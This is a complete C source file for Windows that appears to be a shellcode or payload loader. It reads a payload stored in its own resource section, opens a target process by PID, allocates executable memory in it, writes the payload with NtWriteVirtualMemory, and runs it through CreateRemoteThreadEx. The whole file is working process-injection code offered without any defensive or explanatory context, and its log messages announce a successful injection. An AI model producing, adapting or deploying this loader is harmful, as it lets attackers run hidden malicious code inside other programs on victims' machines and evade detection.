#include <Windows.h>
#include <stdio.h>
#include "resource.h"
#define STATUS_SUCCESS 0

typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	ULONG BufferSize,
	PULONG NumberOfBytesWritten
	);

int main(int argc, char* argv[]) {
	HRSRC hRsrc = NULL;
	HGLOBAL hLoadRsrc = NULL;
	LPVOID lpLockRsrc, lpAddress = NULL;
	DWORD dSizeofRsrc = NULL;
	HANDLE hProc, hThread = INVALID_HANDLE_VALUE;
	DWORD PID, TID = NULL;
	HMODULE hNtdll, hKernel32 = NULL;

	if (argc < 2) {
		printf_s("Usage: %s <pid>", argv[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);

	if (!(hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA))) {
		printf_s("[-] Failed to find any resource! \\------ (%ld)\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Found resource... \\------ (0x%p)\n", hRsrc);

	if (!(hLoadRsrc = LoadResource(NULL, hRsrc))) {
		printf_s("[-] Failed to load resource! \\------ (%ld)\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Successfully loaded resource... \\------ (0x%p)\n", hLoadRsrc);

	if (!(lpLockRsrc = LockResource(hLoadRsrc))) {
		printf_s("[-] Failed to get a pointer to resource! \\------ (%ld)\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Got a pointer to resource... \\------ (0x%p)\n", lpLockRsrc);

	if (!(dSizeofRsrc = SizeofResource(NULL, hRsrc))) {
		printf_s("[-] Failed to get size of resource! \\------ (%ld)\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Got size (%d) of resource... \\------ (0x%p)\n", dSizeofRsrc, hRsrc);

	if (!(hProc = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, NULL, PID))) {
		printf_s("[-] Failed to get handle to process! \\------ (%ld)", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Got a handle to process successfully! \\------ (0x%p)\n", hProc);

	if (!(lpAddress = VirtualAllocEx(hProc, NULL, dSizeofRsrc, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE))) {
		printf_s("[-] Failed to allocated memory! \\------ (%ld)", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Successfully allocated memory! \\------ (0x%p)\n", lpAddress);

	if (!(hNtdll = GetModuleHandleW(L"ntdll.dll"))) {
		printf_s("[-] Failed to get handle to ntdll.dll! \\------ (%ld)", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Got a handle to ntdll.dll! \\------ (0x%p)\n", hNtdll);

	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	if (NtWriteVirtualMemory(hProc, lpAddress, lpLockRsrc, dSizeofRsrc, NULL) != STATUS_SUCCESS) {
		printf_s("[-] Failed to write on allocated memory! \\------ (%ld)", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Written dll to allocated memory successfully! \\------ (0x%p)\n", lpAddress);

	hThread = CreateRemoteThreadEx(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)lpAddress, NULL, NULL, NULL, &TID);
	if (hThread == NULL) {
		printf_s("[-] Failed to execute remote thread! \\------ (%ld)\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Remote thread executed successfully!! \\------ (0x%p)\n", hThread);

	printf_s("[+] waiting for the thread to finish execution!\n");
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProc);

	printf_s("[+] Payload injected successfully from resource section!\n");
	return 0;
}